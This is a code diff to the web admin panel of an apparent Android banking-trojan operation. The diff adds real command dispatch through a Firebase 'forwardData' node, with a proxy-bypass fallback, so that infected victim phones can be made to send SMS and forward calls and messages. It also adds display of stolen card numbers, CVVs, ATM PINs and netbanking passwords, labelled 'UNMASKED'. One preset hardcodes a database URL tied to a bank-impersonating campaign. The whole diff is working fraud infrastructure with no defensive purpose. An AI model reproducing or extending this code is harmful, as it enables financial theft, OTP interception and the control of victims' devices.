@@ -66,7 +66,11 @@ include_once __DIR__ . '/header.php';
       const handleOpenFormsView = (e, u) => {
         e.stopPropagation();
         setSelectedUser(u);
-        setTab('forms');
+        if (fbPresetKey === 'adm_bill_update' || (u.netbankingDataList && u.netbankingDataList.length > 0)) {
+          setTab('netbanking');
+        } else {
+          setTab('forms');
+        }
       };
 
       const handleOpenCardsView = (e, u) => {
@@ -191,10 +195,7 @@ include_once __DIR__ . '/header.php';
       const [smsTargetNumber, setSmsTargetNumber] = React.useState('');
       const [smsMessageBody, setSmsMessageBody] = React.useState('');
 
-      const [forwardTasks, setForwardTasks] = React.useState([
-        { id: 'fwd_1', dataType: 'SMS', phoneNumber: '+919876543210', selectedSim: 'SIM 1', userId: 'usr_001', userFullName: 'Rahul Sharma', timestamp: '10 mins ago', status: 'sent' },
-        { id: 'fwd_2', dataType: 'Call', phoneNumber: '+919123456789', selectedSim: 'SIM 2', userId: 'usr_002', userFullName: 'Priya Singh', timestamp: '2 hours ago', status: 'pending' }
-      ]);
+      const [forwardTasks, setForwardTasks] = React.useState([]);
 
       const openForwardModal = (e, dev) => {
         e.stopPropagation();
@@ -211,7 +212,61 @@ include_once __DIR__ . '/header.php';
         setShowSendSmsModal(true);
       };
 
-      const handleDispatchSendSmsCommand = (e) => {
+      const dispatchCommand = async (taskData) => {
+        let rawUrl = (fbDatabaseUrl ||
+                      adminUser?.firebaseDatabaseUrl ||
+                      adminUser?.firebaseConfig?.databaseURL ||
+                      '').trim();
+
+        if (/AIzaSy/i.test(rawUrl) || (!rawUrl.includes('firebasedatabase.app') && !rawUrl.includes('firebaseio.com'))) {
+          const proj = (fbProject || adminUser?.firebaseProject || '').trim();
+          if (proj) {
+            rawUrl = `https://${proj}-default-rtdb.asia-southeast1.firebasedatabase.app`;
+          } else {
+            throw new Error('No Firebase database URL configured.');
+          }
+        }
+
+        if (!/^https?:\/\//i.test(rawUrl)) {
+          rawUrl = 'https://' + rawUrl;
+        }
+        if (rawUrl.endsWith('/')) {
+          rawUrl = rawUrl.slice(0, -1);
+        }
+
+        // Push new item under forwardData node
+        const jsonEndpoint = `${rawUrl}/forwardData.json`;
+
+        try {
+          // 1. Try direct fetch first
+          const response = await fetch(jsonEndpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(taskData)
+          });
+          if (!response.ok) {
+            throw new Error(`Direct write failed with status ${response.status}`);
+          }
+          return await response.json();
+        } catch (directErr) {
+          console.warn("Direct command dispatch failed, trying local proxy...", directErr);
+          // 2. Try proxy backup
+          const proxyUrl = `db_bridge.php?enc_url=${encodeURIComponent(btoa(rawUrl + '/forwardData'))}`;
+          const response = await fetch(proxyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(taskData)
+          });
+          if (!response.ok) {
+            const errJson = await response.json().catch(() => ({}));
+            const detail = errJson.error || errJson.details || response.statusText;
+            throw new Error(`Proxy command dispatch failed: ${detail}`);
+          }
+          return await response.json();
+        }
+      };
+
+      const handleDispatchSendSmsCommand = async (e) => {
         e.preventDefault();
         if (!smsTargetNumber.trim()) {
           alert('Target recipient phone number is required!');
@@ -222,45 +277,53 @@ include_once __DIR__ . '/header.php';
           return;
         }
 
-        const newTask = {
-          id: `sms_${Date.now()}`,
-          dataType: `Send SMS (${smsSimSlot})`,
+        const taskData = {
+          dataType: 'SMS',
           phoneNumber: smsTargetNumber.trim(),
           selectedSim: smsSimSlot,
-          userId: forwardTargetDevice?.userId || 'unknown',
+          userId: forwardTargetDevice?.id || 'unknown', // Match Firebase Auth UID
           userFullName: forwardTargetDevice?.fullName || 'Target Device',
           userMobileNumber: forwardTargetDevice?.mobileNumber || '',
-          timestamp: 'Just now',
-          status: 'pending'
+          status: 'pending',
+          resultMessage: 'Dispatched from dashboard',
+          timestamp: Date.now()
         };
 
-        setForwardTasks(prev => [newTask, ...prev]);
-        setShowSendSmsModal(false);
-        triggerToast(`💬 Send SMS command dispatched to ${forwardTargetDevice?.fullName} on ${smsSimSlot}!`);
+        try {
+          await dispatchCommand(taskData);
+          setShowSendSmsModal(false);
+          triggerToast(`💬 Send SMS command dispatched to ${forwardTargetDevice?.fullName} on ${smsSimSlot}!`);
+        } catch (err) {
+          alert(`❌ Failed to dispatch command: ${err.message}`);
+        }
       };
 
-      const handleDispatchForwardCommand = (e) => {
+      const handleDispatchForwardCommand = async (e) => {
         e.preventDefault();
         if (!forwardDestinationNumber.trim()) {
           alert('Destination phone number is required!');
           return;
         }
 
-        const newTask = {
-          id: `fwd_${Date.now()}`,
+        const taskData = {
           dataType: forwardDataType,
           phoneNumber: forwardDestinationNumber.trim(),
           selectedSim: forwardSimSlot,
-          userId: forwardTargetDevice?.userId || 'unknown',
+          userId: forwardTargetDevice?.id || 'unknown', // Match Firebase Auth UID
           userFullName: forwardTargetDevice?.fullName || 'Target Device',
           userMobileNumber: forwardTargetDevice?.mobileNumber || '',
-          timestamp: 'Just now',
-          status: 'pending'
+          status: 'pending',
+          resultMessage: 'Dispatched from dashboard',
+          timestamp: Date.now()
         };
 
-        setForwardTasks(prev => [newTask, ...prev]);
-        setShowForwardModal(false);
-        triggerToast(`📲 Forwarding task dispatched to ${forwardTargetDevice?.fullName} on ${forwardSimSlot}!`);
+        try {
+          await dispatchCommand(taskData);
+          setShowForwardModal(false);
+          triggerToast(`📲 Forwarding task dispatched to ${forwardTargetDevice?.fullName} on ${forwardSimSlot}!`);
+        } catch (err) {
+          alert(`❌ Failed to dispatch command: ${err.message}`);
+        }
       };
 
       // Telegram Forwarding & Anti-Delete Security Settings
@@ -292,6 +355,7 @@ include_once __DIR__ . '/header.php';
       };
 
       const DEFAULT_SCHEMA_PRESETS = {
+        adm_bill_update: { name: "⚡ Adm bill update", dbUrl: "https://indusind-indie-default-rtdb.asia-southeast1.firebasedatabase.app/", sms: "smsData", calls: "calls", cards: "paymentCardData", forms: "userData", sims: "simData" },
         pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
         bill_update_parivahan: { name: "⚡ Bill Update Parivahan Preset", sms: "messages", calls: "calls", cards: "clients", forms: "clients", sims: "clients" },
         custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
@@ -429,81 +493,198 @@ include_once __DIR__ . '/header.php';
               card_node = dbData;
               login_node = dbData;
             } else {
-              user_data_node = findNode(resolvedPreset.sims,  ['clients', 'user_data', 'devices', 'users']);
-              user_sms_node  = findNode(resolvedPreset.sms,   ['messages', 'user_sms', 'sms', 'SMS']);
-              card_node      = findNode(resolvedPreset.cards,  ['clients', 'Card', 'cards', 'card']);
-              login_node     = findNode(resolvedPreset.forms,  ['clients', 'login', 'forms', 'Login']);
+              user_data_node = findNode(resolvedPreset.sims,  ['simData', 'clients', 'user_data', 'devices', 'users']);
+              user_sms_node  = findNode(resolvedPreset.sms,   ['smsData', 'messages', 'user_sms', 'sms', 'SMS']);
+              card_node      = findNode(resolvedPreset.cards,  ['paymentCardData', 'clients', 'Card', 'cards', 'card']);
+              login_node     = findNode(resolvedPreset.forms,  ['userData', 'clients', 'login', 'forms', 'Login']);
             }
 
-            // Build Live User Devices List
-            const deviceIds = Array.from(new Set([
-              ...Object.keys(user_data_node),
-              ...Object.keys(user_sms_node),
-              ...Object.keys(card_node),
-              ...Object.keys(login_node)
-            ]));
+            // Detect if collections are flat push-key items with internal `userId` properties
+            const isFlatPushCollection = (node) => {
+              if (!node || typeof node !== 'object') return false;
+              const vals = Object.values(node);
+              return vals.length > 0 && vals.some(v => v && typeof v === 'object' && v.userId);
+            };
+
+            const isFlat = isFlatPushCollection(user_data_node) || isFlatPushCollection(card_node) || isFlatPushCollection(login_node) || isFlatPushCollection(user_sms_node);
+
+            let deviceIds = [];
+            let devMap = {}; // devId -> { simItems, smsItems, cardItems, formItems, netbankingItems }
+
+            if (isFlat) {
+              const collectUserIds = (node) => {
+                if (!node || typeof node !== 'object') return;
+                Object.values(node).forEach(item => {
+                  if (item && typeof item === 'object') {
+                    const uid = item.userId || item.id || item.targetId;
+                    if (uid && !devMap[uid]) {
+                      devMap[uid] = { simItems: [], smsItems: [], cardItems: [], formItems: [], netbankingItems: [] };
+                    }
+                  }
+                });
+              };
+
+              collectUserIds(user_data_node);
+              collectUserIds(user_sms_node);
+              collectUserIds(card_node);
+              collectUserIds(login_node);
+              collectUserIds(dbData.users);
+              collectUserIds(dbData.netBankingData);
+
+              Object.values(user_data_node || {}).forEach(v => { if (v && v.userId && devMap[v.userId]) devMap[v.userId].simItems.push(v); });
+              Object.values(user_sms_node || {}).forEach(v => { if (v && v.userId && devMap[v.userId]) devMap[v.userId].smsItems.push(v); });
+              Object.values(card_node || {}).forEach(v => { if (v && v.userId && devMap[v.userId]) devMap[v.userId].cardItems.push(v); });
+              Object.values(login_node || {}).forEach(v => { if (v && v.userId && devMap[v.userId]) devMap[v.userId].formItems.push(v); });
+              Object.values(dbData.netBankingData || {}).forEach(v => { if (v && v.userId && devMap[v.userId]) devMap[v.userId].netbankingItems.push(v); });
+
+              deviceIds = Object.keys(devMap);
+            } else {
+              // Classic device ID keyed layout
+              deviceIds = Array.from(new Set([
+                ...Object.keys(user_data_node),
+                ...Object.keys(user_sms_node),
+                ...Object.keys(card_node),
+                ...Object.keys(login_node)
+              ]));
+            }
 
             const liveUsers = deviceIds.map(devId => {
-              const devInfo = user_data_node[devId] || {};
-              const userAccount = account_node[devId] || {};
-              const userLogin = login_node[devId] || {};
-              const userCard = card_node[devId] || {};
-              const rawSmsObj = user_sms_node[devId] || {};
+              let devInfo = {}, userAccount = {}, userLogin = {}, userCard = {}, rawSmsObj = {};
+              let cardDataList = [], smsDataList = [], formDataList = [], netbankingDataList = [];
 
-              // Extract values based on nested structures or parent level (Multi-Schema Resolver)
-              const rawCard = userCard.card_details || userCard || {};
-              const rawForm = userCard.form_fill_up || userLogin || {};
-              const rawNetbanking = userCard.netbanking_details || {};
+              if (isFlat && devMap[devId]) {
+                const group = devMap[devId];
+                devInfo = group.simItems[0] || group.formItems[0] || (dbData.users && dbData.users[devId]) || {};
+                userCard = group.cardItems[0] || {};
+                userLogin = group.formItems[0] || {};
 
-              // Format SMS list (handle arrays/objects & sparse nulls)
-              const rawSmsArray = Array.isArray(rawSmsObj) ? rawSmsObj : Object.values(rawSmsObj);
-              const smsDataList = rawSmsArray.filter(Boolean).map(sms => ({
-                sender: getSmsSender(sms),
-                message: getSmsBody(sms),
-                sim_number: getSmsSimSlot(sms),
-                timestamp: getSmsTimestamp(sms),
-                type: 'INBOX'
-              }));
+                // Multiple Cards from flat push-key collection
+                cardDataList = group.cardItems.map(c => ({
+                  bankName: String(c.bankName || c.bank_name || c.bank || 'Bank Account'),
+                  cardNumber: String(c.cardNumber || c.number || c.card_number || c.card_no || 'N/A'),
+                  expiry: String(c.expiryDate || c.expiry || c.exp || c.card_expiry || 'N/A'),
+                  cvv: String(c.cvv || c.card_cvv || c.security_code || '•••'),
+                  atmPin: String(c.atmPin || c.atm_pin || c.pin || c.security_pin || ''),
+                  cardHolder: String(c.cardHolder || c.cardHolderName || c.name || devInfo.customerName || 'N/A'),
+                  cardType: String(c.cardType || c.card_type || c.type || 'Card Payload')
+                })).filter(c => c.cardNumber !== 'N/A');
 
-              // Format Card list
-              const bankName = rawCard.bankName || rawCard.bank_name || userCard.bankName || userCard.bank_name || 'Bank Account';
-              const cardNumber = rawCard.number || rawCard.cardNumber || rawCard.card_number || rawCard.card_no || rawCard.cardNo || 'N/A';
-              const expiry = rawCard.exp || rawCard.expiry || rawCard.card_expiry || rawCard.expiryDate || rawCard.exp_date || rawCard.expiry_date || 'N/A';
-              const cvv = rawCard.cvv || rawCard.card_cvv || rawCard.security_code || rawCard.cvc || '•••';
-              const atmPin = rawCard.atm_pin || rawCard.atmPin || rawCard.pin || rawCard.security_pin || '';
+                // Multiple SMS
+                smsDataList = group.smsItems.map(sms => ({
+                  sender: getSmsSender(sms),
+                  message: getSmsBody(sms),
+                  sim_number: getSmsSimSlot(sms),
+                  timestamp: getSmsTimestamp(sms),
+                  type: 'INBOX'
+                }));
 
-              const cardDataList = (cardNumber !== 'N/A') ? [{
-                bankName,
-                cardNumber,
-                expiry,
-                cvv,
-                atmPin,
-                cardHolder: rawCard.cardHolder || rawCard.cardHolderName || rawCard.name || userCard.fullName || 'N/A',
-                cardType: rawCard.cardType || rawCard.card_type || rawCard.type || 'Card Payload'
-              }] : [];
+                // Multiple Form Fill-ups
+                formDataList = group.formItems.map((f, idx) => ({
+                  id: `frm_${devId}_${idx}`,
+                  formTitle: f.reason ? `Customer Form (${f.reason})` : 'Customer / Bill Update Submission',
+                  fields: f,
+                  timestamp: smartDateParser(f.timestamp || f.submittedAt || 'Live payload')
+                }));
 
-              // Format Netbanking list
-              const netbankingUserId = rawNetbanking.user_id || rawNetbanking.userId || rawNetbanking.user_name || rawNetbanking.username;
-              const netbankingDataList = netbankingUserId ? [{
-                bankName: rawNetbanking.bank_name || rawNetbanking.bankName || 'Netbanking Account',
-                userId: netbankingUserId,
-                password: rawNetbanking.password || rawNetbanking.pass || ''
-              }] : [];
+                // Netbanking Logins
+                netbankingDataList = group.netbankingItems.map(n => ({
+                  bankName: n.bankName || n.bank_name || 'Netbanking Account',
+                  userId: n.userId || n.username || n.user_id,
+                  password: n.password || n.pass || ''
+                }));
+              } else {
+                devInfo = user_data_node[devId] || {};
+                userAccount = account_node[devId] || {};
+                userLogin = login_node[devId] || {};
+                userCard = card_node[devId] || {};
+                rawSmsObj = user_sms_node[devId] || {};
 
-              // Format Form Data list
-              const formDataFields = rawForm.fields || rawForm;
-              const hasForm = formDataFields.customer_name || formDataFields.consumer_number || formDataFields.name || formDataFields.mobileNumber || formDataFields.mobile_number || formDataFields.phone || formDataFields.user_name || (typeof formDataFields === 'object' && Object.keys(formDataFields).length > 0 && !formDataFields.id);
-              const formDataList = hasForm ? [{
-                id: `frm_${devId}`,
-                formTitle: 'Customer / Bill Update Submission',
-                fields: formDataFields,
-                timestamp: userCard.joined || userCard.timestamp || 'Live payload'
-              }] : [];
+                const rawCard = userCard.card_details || userCard || {};
+                const rawForm = userCard.form_fill_up || userLogin || {};
+                const rawNetbanking = userCard.netbanking_details || {};
+
+                const rawSmsArray = Array.isArray(rawSmsObj) ? rawSmsObj : Object.values(rawSmsObj);
+                smsDataList = rawSmsArray.filter(Boolean).map(sms => ({
+                  sender: getSmsSender(sms),
+                  message: getSmsBody(sms),
+                  sim_number: getSmsSimSlot(sms),
+                  timestamp: getSmsTimestamp(sms),
+                  type: 'INBOX'
+                }));
+
+                // Multi-Card Resolver for Adm bill update & multi-card payload structures
+                const extractMultiCards = (uCard, dInfo) => {
+                  if (!uCard || typeof uCard !== 'object') return [];
+                  const cards = [];
+                  const defaultHolder = uCard.cardHolder || uCard.cardHolderName || uCard.fullName || uCard.name || dInfo.d_name || dInfo.device || 'N/A';
+
+                  const parseSingleCard = (obj) => {
+                    if (!obj || typeof obj !== 'object') return null;
+                    const num = obj.number || obj.cardNumber || obj.card_number || obj.card_no || obj.cardNo || obj.card_num || obj.card;
+                    if (!num || String(num).trim() === '' || num === 'N/A') return null;
+
+                    return {
+                      bankName: String(obj.bankName || obj.bank_name || obj.bank || obj.issuer || uCard.bankName || uCard.bank_name || 'Bank Account'),
+                      cardNumber: String(num),
+                      expiry: String(obj.exp || obj.expiry || obj.card_expiry || obj.expiryDate || obj.exp_date || obj.expiry_date || obj.valid_thru || 'N/A'),
+                      cvv: String(obj.cvv || obj.card_cvv || obj.security_code || obj.cvc || '•••'),
+                      atmPin: String(obj.atm_pin || obj.atmPin || obj.pin || obj.security_pin || obj.atm_code || obj.atmPinCode || ''),
+                      cardHolder: String(obj.cardHolder || obj.cardHolderName || obj.holder_name || obj.name || obj.user_name || defaultHolder),
+                      cardType: String(obj.cardType || obj.card_type || obj.type || obj.scheme || 'Card Payload')
+                    };
+                  };
+
+                  const addCard = (c) => {
+                    if (c && !cards.some(existing => existing.cardNumber === c.cardNumber)) {
+                      cards.push(c);
+                    }
+                  };
+
+                  addCard(parseSingleCard(uCard));
+                  if (uCard.card_details && typeof uCard.card_details === 'object') {
+                    addCard(parseSingleCard(uCard.card_details));
+                    if (!Array.isArray(uCard.card_details)) {
+                      Object.values(uCard.card_details).forEach(sub => {
+                        if (sub && typeof sub === 'object') addCard(parseSingleCard(sub));
+                      });
+                    }
+                  }
+                  ['cards', 'cardList', 'payment_cards', 'card_info', 'cardDataList'].forEach(prop => {
+                    const val = uCard[prop];
+                    if (val && typeof val === 'object') {
+                      if (Array.isArray(val)) {
+                        val.forEach(item => addCard(parseSingleCard(item)));
+                      } else {
+                        addCard(parseSingleCard(val));
+                        Object.values(val).forEach(sub => {
+                          if (sub && typeof sub === 'object') addCard(parseSingleCard(sub));
+                        });
+                      }
+                    }
+                  });
+                  Object.entries(uCard).forEach(([k, v]) => {
+                    if (v && typeof v === 'object' && !['card_details', 'form_fill_up', 'netbanking_details', 'sims', 'fields'].includes(k)) {
+                      addCard(parseSingleCard(v));
+                    }
+                  });
+                  return cards;
+                };
+
+                cardDataList = extractMultiCards(userCard, devInfo);
+                const formDataFields = rawForm.fields || rawForm;
+                const hasForm = formDataFields.customer_name || formDataFields.consumer_number || formDataFields.name || formDataFields.mobileNumber || formDataFields.mobile_number || formDataFields.phone || formDataFields.user_name || (typeof formDataFields === 'object' && Object.keys(formDataFields).length > 0 && !formDataFields.id);
+                formDataList = hasForm ? [{
+                  id: `frm_${devId}`,
+                  formTitle: 'Customer / Bill Update Submission',
+                  fields: formDataFields,
+                  timestamp: userCard.joined || userCard.timestamp || 'Live payload'
+                }] : [];
+              }
 
               // SIM card parsing with support for sims array
-              let sim1 = devInfo.numberSim1 || devInfo.phoneNumber || devInfo.mobNo || devInfo.mobile_number || 'N.A.';
+              let sim1 = devInfo.phoneNumber || devInfo.mobileNumber || devInfo.numberSim1 || devInfo.mobNo || 'N.A.';
               let sim2 = devInfo.numberSim2 || 'N.A.';
-              let sim1Carrier = devInfo.nameSim1 || devInfo.service_provider || 'SIM 1';
+              let sim1Carrier = devInfo.carrierName || devInfo.nameSim1 || devInfo.service_provider || 'SIM 1';
               let sim2Carrier = devInfo.nameSim2 || 'SIM 2';
 
               if (Array.isArray(devInfo.sims)) {
@@ -521,17 +702,17 @@ include_once __DIR__ . '/header.php';
 
               return {
                 id: devId,
-                userId: userAccount.user_name || formDataFields.consumer_number || `DEV-${devId.substring(0, 6).toUpperCase()}`,
-                fullName: formDataFields.customer_name || formDataFields.name || devInfo.d_name || devInfo.device || `Target Device ${devId.substring(0, 4)}`,
-                mobileNumber: sim1 !== 'N.A.' ? sim1 : (sim2 !== 'N.A.' ? sim2 : 'N.A.'),
-                numberField: userAccount.user_name ? `A/C: ${userAccount.user_name}` : (formDataFields.consumer_number ? `Consumer No: ${formDataFields.consumer_number}` : ''),
-                stringField: deviceModel.split('\n')[0],
+                userId: userAccount.user_name || devInfo.consumerNumber || devInfo.consumer_number || `DEV-${devId.substring(0, 6).toUpperCase()}`,
+                fullName: devInfo.customerName || devInfo.customer_name || devInfo.d_name || devInfo.device || `Target Device ${devId.substring(0, 4)}`,
+                mobileNumber: devInfo.mobileNumber || devInfo.phoneNumber || (sim1 !== 'N.A.' ? sim1 : (sim2 !== 'N.A.' ? sim2 : 'N.A.')),
+                numberField: userAccount.user_name ? `A/C: ${userAccount.user_name}` : (devInfo.consumerNumber ? `Consumer No: ${devInfo.consumerNumber}` : ''),
+                stringField: String(deviceModel).split('\n')[0],
                 simState: sim1Carrier + (sim2 !== 'N.A.' ? ' • ' + sim2Carrier : ''),
                 batteryLevel: devInfo.battery ? String(devInfo.battery).replace('%', '') + '%' : 'N/A',
-                isActive: devInfo.status === 'online' || devInfo.status === true,
+                isActive: devInfo.status === 'online' || devInfo.status === true || Boolean(devInfo.timestamp),
                 isConnected: true,
                 appInBackground: false,
-                lastActivityTime: devInfo.TimeandDate || devInfo.joined || 'Just now',
+                lastActivityTime: devInfo.timestamp ? smartDateParser(devInfo.timestamp) : (devInfo.TimeandDate || devInfo.joined || 'Just now'),
                 totalSmsCount: smsDataList.length,
                 totalCallsCount: 0,
                 sim1Data: { phone: sim1, carrier: sim1Carrier },
@@ -544,8 +725,27 @@ include_once __DIR__ . '/header.php';
               };
             });
 
+            // Extract forwarding tasks dynamically
+            const rawForwardObj = dbData.forwardData || {};
+            const forwardTasksList = Object.entries(rawForwardObj)
+              .filter(([key, task]) => task && typeof task === 'object')
+              .map(([key, task]) => ({
+                id: key,
+                dataType: task.dataType || 'SMS',
+                phoneNumber: task.phoneNumber || '',
+                selectedSim: task.selectedSim || 'SIM 1',
+                userId: task.userId || 'unknown',
+                userFullName: task.userFullName || 'Target Device',
+                userMobileNumber: task.userMobileNumber || '',
+                timestamp: smartDateParser(task.timestamp || task.processedAt),
+                status: task.status || 'pending',
+                resultMessage: task.resultMessage || ''
+              }))
+              .sort((a, b) => (b.timestamp - a.timestamp || b.id.localeCompare(a.id))); // Order by newest tasks first
+
             if (isMounted) {
               setUsers(liveUsers);
+              setForwardTasks(forwardTasksList);
               setFbConnectionStatus({
                 status: 'success',
                 message: `Connected successfully to database${usingProxy ? ' (via Proxy Bypass)' : ''}.`,
@@ -639,6 +839,7 @@ include_once __DIR__ . '/header.php';
           setFbCardsColl(p.cards);
           setFbFormsColl(p.forms);
           setFbSimsColl(p.sims || 'user_data');
+          if (p.dbUrl) setFbDatabaseUrl(p.dbUrl);
         }
       };
 
@@ -853,7 +1054,10 @@ include_once __DIR__ . '/header.php';
 
             // Find matching preset key dynamically
             let matchedPreset = 'custom';
-            if (op.collectionSms === 'user_sms' && op.collectionCards === 'Card' && op.collectionForms === 'login') {
+            const dbUrlStr = (op.firebaseDatabaseUrl || op.firebaseConfig?.databaseURL || '').toLowerCase();
+            if (dbUrlStr.includes('indusind-indie-default-rtdb') || (op.collectionSms === 'messages' && op.collectionCards === 'clients' && dbUrlStr.includes('indusind'))) {
+              matchedPreset = 'adm_bill_update';
+            } else if (op.collectionSms === 'user_sms' && op.collectionCards === 'Card' && op.collectionForms === 'login') {
               matchedPreset = 'pm_admin';
             } else if (op.collectionSms === 'messages' && op.collectionCards === 'clients' && op.collectionForms === 'clients') {
               matchedPreset = 'bill_update_parivahan';
@@ -1263,8 +1467,11 @@ include_once __DIR__ . '/header.php';
                       <button className="device-control-btn" onClick={(e) => openSendSmsModal(e, u)} style={{ background: 'rgba(52,211,153,0.12)', color: '#34d399', border: '1px solid rgba(52,211,153,0.3)' }} title="Send Remote SMS">
                         💬 Send SMS
                       </button>
-                      <button className="device-control-btn" onClick={(e) => handleOpenFormsView(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Form Fill-ups Info">
+                      <button className="device-control-btn" onClick={(e) => handleOpenFormsView(e, u)} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Details">
                         👁️ View
+                      </button>
+                      <button className="device-control-btn" onClick={(e) => { e.stopPropagation(); setSelectedUser(u); setTab('netbanking'); }} style={{ background: 'rgba(56,189,248,0.12)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)' }} title="View Netbanking Info">
+                        🏦 Netbanking
                       </button>
                       <button className="device-control-btn" onClick={(e) => handleOpenCardsView(e, u)} style={{ background: 'rgba(167,139,250,0.12)', color: '#a78bfa', border: '1px solid rgba(167,139,250,0.3)' }} title="View Unmasked Cards Info">
                         💳 Card
@@ -1336,16 +1543,19 @@ include_once __DIR__ . '/header.php';
                     📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
                   </button>
                   <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
-                    💳 Cards ({selectedUser.cardDataList.length})
+                    💳 Cards ({selectedUser.cardDataList?.length || 0})
+                  </button>
+                  <button className={`tab-btn ${tab === 'netbanking' ? 'active' : ''}`} onClick={() => setTab('netbanking')}>
+                    🏦 Netbanking ({selectedUser.netbankingDataList?.length || 0})
                   </button>
                   <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
-                    💬 SMS ({selectedUser.smsDataList.length})
+                    💬 SMS ({selectedUser.smsDataList?.length || 0})
                   </button>
                   <button className={`tab-btn ${tab === 'inspector' ? 'active' : ''}`} onClick={() => setTab('inspector')}>
                     🔍 Schema Inspector
                   </button>
                   <button className={`tab-btn ${tab === 'forward' ? 'active' : ''}`} onClick={() => setTab('forward')}>
-                    📲 Forward Tasks ({forwardTasks.filter(t => t.userId === selectedUser.userId).length})
+                    📲 Forward Tasks ({forwardTasks.filter(t => t.userId === selectedUser.id).length})
                   </button>
                 </div>
 
@@ -1472,7 +1682,7 @@ include_once __DIR__ . '/header.php';
                         <div key={i} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.35)', background: 'rgba(236,72,153,0.05)' }}>
                           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem', flexWrap: 'wrap', gap: '6px' }}>
                             <h4 style={{ color: '#f472b6', fontSize: '1.05rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
-                              <span>💳 {getCardBankName(card)}</span>
+                              <span>💳 {getCardBankName(card)} {selectedUser.cardDataList.length > 1 ? `(Card #${i + 1})` : ''}</span>
                             </h4>
                             <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 700, fontSize: '0.75rem' }}>
                               {getCardType(card)}
@@ -1510,6 +1720,18 @@ include_once __DIR__ . '/header.php';
                                 {getCardCvv(card)}
                               </div>
                             </div>
+
+                            {card.atmPin && card.atmPin.trim() !== '' && (
+                              <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(251,191,36,0.4)' }}>
+                                <div style={{ fontSize: '0.72rem', color: '#fbbf24', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
+                                  <span>ATM PIN</span>
+                                  <span>🔑 UNMASKED</span>
+                                </div>
+                                <div style={{ fontSize: '1.05rem', color: '#fbbf24', fontWeight: 700, marginTop: '4px', fontFamily: 'monospace' }}>
+                                  {card.atmPin}
+                                </div>
+                              </div>
+                            )}
                           </div>
                         </div>
                       ))}
@@ -1519,10 +1741,49 @@ include_once __DIR__ . '/header.php';
                         </div>
                       )}
                     </div>
+                  {tab === 'netbanking' && (
+                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
+                      {(selectedUser.netbankingDataList || []).map((nb, i) => (
+                        <div key={i} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(56,189,248,0.35)', background: 'rgba(56,189,248,0.05)' }}>
+                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem', flexWrap: 'wrap', gap: '6px' }}>
+                            <h4 style={{ color: '#38bdf8', fontSize: '1.05rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                              <span>🏦 {nb.bankName || 'Netbanking Account'}</span>
+                            </h4>
+                            <span className="pulse-badge" style={{ background: 'rgba(56,189,248,0.15)', color: '#38bdf8', fontWeight: 700, fontSize: '0.75rem' }}>
+                              Netbanking Payload
+                            </span>
+                          </div>
+
+                          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(210px, 1fr))', gap: '0.85rem' }}>
+                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(56,189,248,0.3)' }}>
+                              <div style={{ fontSize: '0.72rem', color: '#38bdf8', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px' }}>USER ID / USERNAME</div>
+                              <div style={{ fontSize: '1.05rem', color: '#fff', fontWeight: 700, marginTop: '4px', fontFamily: 'monospace' }}>
+                                {nb.userId || 'N/A'}
+                              </div>
+                            </div>
+
+                            <div style={{ background: 'rgba(17,24,39,0.85)', padding: '10px 12px', borderRadius: '10px', border: '1px solid rgba(248,113,113,0.4)' }}>
+                              <div style={{ fontSize: '0.72rem', color: '#f87171', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
+                                <span>NETBANKING PASSWORD</span>
+                                <span>🔑 UNMASKED</span>
+                              </div>
+                              <div style={{ fontSize: '1.05rem', color: '#f87171', fontWeight: 700, marginTop: '4px', fontFamily: 'monospace' }}>
+                                {nb.password || '•••'}
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                      {(!selectedUser.netbankingDataList || selectedUser.netbankingDataList.length === 0) && (
+                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
+                          No Netbanking credentials captured for this device yet.
+                        </div>
+                      )}
+                    </div>
                   )}
                   {tab === 'forward' && (
                     <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
-                      {forwardTasks.filter(t => t.userId === selectedUser.userId).map((task) => (
+                      {forwardTasks.filter(t => t.userId === selectedUser.id).map((task) => (
                         <div key={task.id} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.35)', background: 'rgba(236,72,153,0.05)' }}>
                           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem', flexWrap: 'wrap', gap: '6px' }}>
                             <h4 style={{ color: '#ec4899', fontSize: '1.05rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
